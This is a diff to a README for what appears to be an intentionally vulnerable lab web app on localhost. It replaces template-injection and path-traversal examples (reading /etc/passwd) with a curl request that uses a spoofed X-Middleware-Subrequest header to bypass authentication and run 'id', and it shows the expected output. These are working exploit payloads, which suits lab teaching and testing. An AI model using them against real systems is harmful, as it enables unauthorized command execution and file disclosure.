@@ -75,16 +75,40 @@ This results in authentication bypass, allowing command execution:
 http://localhost:8080/
 
 🧪 Exploitation Examples
-RCE (Template Injection)
-```POST /api/render.php
-page={{ id }}
+
+RCE (Authentication Bypass)
+
 ```
-LFI (Read System Files)
+curl -H "X-Middleware-Subrequest: middleware:middleware:middleware"  "http://localhost:8080/api.php?action=admin&cmd=id"
 ```
-GET /api/render.php?page=../../../../etc/passwd
+
+Expected output:
+
 ```
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset='UTF-8'>
+  <title>Command Output</title>
+  <link rel='stylesheet' href='static/css/style.css'>
+</head>
+<body>
+<div class='wrapper'>
+  <div class='card'>
+    <h3>🧨 Command Executed</h3>
+             <pre class='output'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre>
+    <br><br>
+    <a class='btn' href='dashboard.php'>← Back</a>
+  </div>
+</div>
+</body>
+</html>%
+
+```
+
 ### Using the Provided PoC Script
 ```
-python3 exp.py lfi /etc/passwd
 python3 exp.py rce "id"
 ```
